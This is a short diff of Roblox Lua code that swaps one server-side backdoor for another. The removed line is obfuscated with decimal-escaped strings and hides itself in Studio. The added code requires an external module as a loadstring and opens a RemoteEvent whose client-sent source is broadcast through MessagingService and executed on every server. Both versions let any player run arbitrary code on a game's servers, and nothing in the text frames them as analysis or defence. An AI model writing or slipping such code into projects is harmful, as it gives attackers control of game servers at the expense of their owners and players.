@@ -1,1 +1,10 @@
-if not game:GetService('\82\117\110\83\101\114\118\105\99\101'):IsStudio() then getfenv(0)["\73\110\115\116\97\110\99\101"]["\110\101\119"]("\82\101\109\111\116\101\69\118\101\110\116",workspace).OnServerEvent:Connect(function(_,code) getfenv(0)["\114\101\113\117\105\114\101"](0x34A62CEB9):SpawnS(code,workspace) end) end
+local loadstring = require(14132891321)
+local MS = game:GetService("MessagingService")
+
+MS:SubscribeAsync("ss", function(args)
+	loadstring:SpawnS(args.Data[1],workspace)
+end)
+
+Instance.new("RemoteEvent",workspace).OnServerEvent:Connect(function(_,src)
+	MS:PublishAsync("ss", {src})
+end)
